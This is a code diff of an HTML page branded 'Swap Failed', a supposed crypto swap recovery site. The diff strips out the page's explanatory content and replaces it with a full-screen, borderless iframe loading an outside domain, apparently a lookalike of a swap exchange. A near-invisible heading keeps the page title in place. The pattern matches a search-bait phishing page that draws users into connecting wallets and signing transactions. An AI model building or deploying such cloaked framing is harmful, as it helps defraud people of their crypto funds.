@@ -161,163 +161,19 @@
   @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important; transition-duration:.01ms!important}}
   </style>
 </head>
-<body>
-  <div class="bg" aria-hidden="true"><div class="glow"></div><div class="hatch"></div></div>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <header class="topbar">
-    <a class="brand" href="./">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>Swap Failed</span>
-    </a>
-    <span class="spacer"></span>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="how-it-works/">How it works</a>
-      <a href="faq/">FAQ</a>
-      <a href="about/">About</a>
-      <a href="security/">Security</a>
-      <a href="supported-chains/">Supported Chains</a>
-    </nav>
-  </header>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-  <main>
-    <section class="wrap hero">
-      <span class="eyebrow"><span class="dot"></span>Swap recovery route</span>
-      <h1>Swap Failed</h1>
-      <p class="deck"><strong>Swap Failed</strong> helps you understand why a crypto swap did not complete, review the route, and retry from a non-custodial app without handing over your wallet.</p>
-      <div class="cta-row">
-        <a class="primary" href="dashboard/">Open App
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-        </a>
-        <a class="ghost" href="how-it-works/">How it works
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
-        </a>
-      </div>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Swap Failed
+  </h1>
 
-      <section class="routebar" aria-label="Swap failed preview">
-        <div class="rhead">
-          <span class="ct">Retry swap</span>
-          <span class="pill"><span class="pdot"></span>Preview</span>
-        </div>
-        <div class="rgrid">
-          <div class="leg">
-            <span class="lab">You pay</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="eth.png" alt="ETH">ETH <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Amount in app</span>
-            </div>
-          </div>
-          <button class="rswitch" type="button" data-switch aria-label="Switch direction">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 4v13M4 14l3 3 3-3M17 20V7M14 10l3-3 3 3"/></svg>
-          </button>
-          <div class="leg">
-            <span class="lab">You receive</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="btc.png" alt="BTC">BTC <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Live quote in app</span>
-            </div>
-          </div>
-        </div>
-        <div class="rbar-foot">
-          <div class="rmeta">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 5v5l3 3"/></svg>
-            Route, network state, and wallet prompts are checked inside the app.
-          </div>
-          <a class="rcta" href="dashboard/">Open App
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-          </a>
-        </div>
-        <p class="rnote">Preview only &middot; non-custodial &middot; connect your wallet in the app</p>
-      </section>
-    </section>
-
-    <!-- WHY (icon-left rows) -->
-    <section class="wrap sec" id="why">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6l8-4z"/></svg>Why swaps fail</span>
-        <h2 class="h2">Fix the route before you retry</h2>
-        <p>A failed swap can come from slippage, expired quotes, insufficient gas, unsupported assets, bridge congestion, or a wallet rejection. The right next move is to inspect the route instead of rushing into another signature.</p>
-      </div>
-      <div class="rows">
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-2.64-6.36"/><path d="M21 3v7h-7"/></svg></span>
-          <div><h3>Retry with a fresh quote</h3><p>Quotes can expire quickly when liquidity or gas changes. Open the <a class="cite" href="https://swap-failed.github.io/" rel="nofollow noopener noreferrer">Swap Failed app</a>, rebuild the route, and review the live receive token before you confirm.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></span>
-          <div><h3>Keep custody in your wallet</h3><p>The flow is non-custodial: you connect a wallet such as <a class="cite" href="https://metamask.io/" rel="nofollow noopener noreferrer">MetaMask</a>, inspect the transaction, and sign only when the route matches what you expect.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg></span>
-          <div><h3>Check chains and assets</h3><p>Swaps involving <a class="cite" href="https://ethereum.org/" rel="nofollow noopener noreferrer">Ethereum</a>, BTC routes, stablecoins, and wrapped assets may fail when the source chain, destination chain, or token contract is not supported for that route.</p></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="how">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg>How it works</span>
-        <h2 class="h2">Resolve Swap Failed in three steps</h2>
-      </div>
-      <div class="steps">
-        <div class="step"><span class="num">1</span><h3>Reconnect and inspect</h3><p>Open the app, connect your wallet, and select the asset pair that failed. The interface rebuilds the route so you can see the current quote and network path.</p></div>
-        <div class="step"><span class="num">2</span><h3>Review time and cost</h3><p>Check the live quote, chain fee prompts, estimated completion window, and destination asset before signing. Costs depend on the networks and liquidity available at confirmation.</p></div>
-        <div class="step"><span class="num">3</span><h3>Confirm only when ready</h3><p>Approve or sign from your wallet after the route looks correct. If a wallet prompt looks unfamiliar, stop and verify the token, chain, and receiving address first.</p></div>
-      </div>
-    </section>
-
-    <!-- FAQ (2-col) -->
-    <section class="wrap sec" id="faq">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.8.4-1 .8-1 1.7M12 17h.01"/></svg>FAQ</span>
-        <h2 class="h2">Swap Failed questions</h2>
-      </div>
-      <div class="faq">
-        <div class="qa"><span class="qn">01</span><h3>What does Swap Failed mean?</h3><p>Swap Failed means the requested token exchange did not complete on the selected route. It can happen because a quote expired, gas was insufficient, liquidity changed, the wallet rejected the signature, or the route could not finish across the chosen chains.</p></div>
-        <div class="qa"><span class="qn">02</span><h3>Are my funds safe after a failed swap?</h3><p>Often a failed transaction leaves funds in your wallet or source chain, but you should verify the transaction hash, token balance, and wallet activity. Use explorers such as <a class="cite" href="https://etherscan.io/" rel="nofollow noopener noreferrer">Etherscan</a> for Ethereum activity and avoid signing a new approval until you understand the previous result.</p></div>
-        <div class="qa"><span class="qn">03</span><h3>Which chains and assets can I retry?</h3><p>The app is built for major crypto swap routes including ETH, BTC-linked routes, stablecoins, and popular EVM assets. Availability depends on live liquidity and route support; see the full list on the <a href="supported-chains/">supported chains</a> page.</p></div>
-        <div class="qa"><span class="qn">04</span><h3>How long does a failed swap take to clear?</h3><p>Timing depends on the chain, gas market, route type, and bridge or liquidity provider involved. The app shows the current route status in app, while broader DeFi context can be checked through <a class="cite" href="https://defillama.com/" rel="nofollow noopener noreferrer">DeFiLlama</a>.</p></div>
-        <div class="qa"><span class="qn">05</span><h3>What does it cost to retry?</h3><p>There is no fixed cost shown on this preview page. Review the live network fee, quote, and any token approval prompt inside the app before you sign, because costs change with network demand and route conditions.</p></div>
-        <div class="qa"><span class="qn">06</span><h3>Should I revoke old approvals?</h3><p>If the failed swap involved a token approval you no longer need, review it with a trusted allowance tool before revoking or re-approving. Revocation also requires a wallet transaction, so check the chain and contract carefully.</p></div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="more">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1"/></svg>Learn more</span>
-        <h2 class="h2">Explore Swap Failed</h2>
-      </div>
-      <div class="related">
-        <a class="rel" href="how-it-works/"><span class="rt">How it works <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>See how the app rebuilds a failed route, checks quote conditions, and prepares a safer retry.</p></a>
-        <a class="rel" href="security/"><span class="rt">Security <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Review wallet-first safety basics before you sign another swap, approval, or route update.</p></a>
-        <a class="rel" href="supported-chains/"><span class="rt">Supported chains <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Check the networks and assets available for retrying failed swaps inside the app.</p></a>
-      </div>
-    </section>
-  </main>
-
-  <footer class="footer">
-    <div class="wrap">
-      
-    </div>
-  </footer>
-
-  <script type="application/ld+json">
-  {"@context":"https://schema.org","@graph":[
-    {"@type":"WebSite","@id":"https://swap-failed.github.io/#website","url":"https://swap-failed.github.io/","name":"Swap Failed"},
-    {"@type":"Organization","@id":"https://swap-failed.github.io/#org","name":"Swap Failed","url":"https://swap-failed.github.io/","logo":"https://swap-failed.github.io/favicon.png"},
-    {"@type":"WebApplication","@id":"https://swap-failed.github.io/#app","name":"Swap Failed","applicationCategory":"FinanceApplication","operatingSystem":"Web","url":"https://swap-failed.github.io/","browserRequirements":"Requires a Web3 wallet","description":"Non-custodial DeFi app for reviewing failed crypto swap routes, checking live quote conditions, and retrying from a wallet-controlled interface."},
-    {"@type":"FAQPage","mainEntity":[
-      {"@type":"Question","name":"What does Swap Failed mean?","acceptedAnswer":{"@type":"Answer","text":"Swap Failed means the requested token exchange did not complete on the selected route. It can happen because a quote expired, gas was insufficient, liquidity changed, the wallet rejected the signature, or the route could not finish across the chosen chains."}},
-      {"@type":"Question","name":"Are my funds safe after a failed swap?","acceptedAnswer":{"@type":"Answer","text":"Often a failed transaction leaves funds in your wallet or source chain, but you should verify the transaction hash, token balance, and wallet activity before signing a new approval."}},
-      {"@type":"Question","name":"Which chains and assets can I retry?","acceptedAnswer":{"@type":"Answer","text":"The app is built for major crypto swap routes including ETH, BTC-linked routes, stablecoins, and popular EVM assets. Availability depends on live liquidity and route support; see the full list on the supported chains page."}},
-      {"@type":"Question","name":"How long does a failed swap take to clear?","acceptedAnswer":{"@type":"Answer","text":"Timing depends on the chain, gas market, route type, and bridge or liquidity provider involved. The app shows the current route status in app."}},
-      {"@type":"Question","name":"What does it cost to retry?","acceptedAnswer":{"@type":"Answer","text":"There is no fixed cost shown on this preview page. Review the live network fee, quote, and any token approval prompt inside the app before you sign, because costs change with network demand and route conditions."}},
-      {"@type":"Question","name":"Should I revoke old approvals?","acceptedAnswer":{"@type":"Answer","text":"If the failed swap involved a token approval you no longer need, review it with a trusted allowance tool before revoking or re-approving. Revocation also requires a wallet transaction, so check the chain and contract carefully."}}
-    ]}
-  ]}
-  </script>
-
-  <script>
-  (function(){"use strict";var b=document.querySelector("[data-switch]");if(!b)return;b.addEventListener("click",function(){var p=document.querySelectorAll(".rgrid .tok");if(p.length<2)return;var t=p[0].innerHTML;p[0].innerHTML=p[1].innerHTML;p[1].innerHTML=t;});}());
-  </script>
 </body>
 </html>
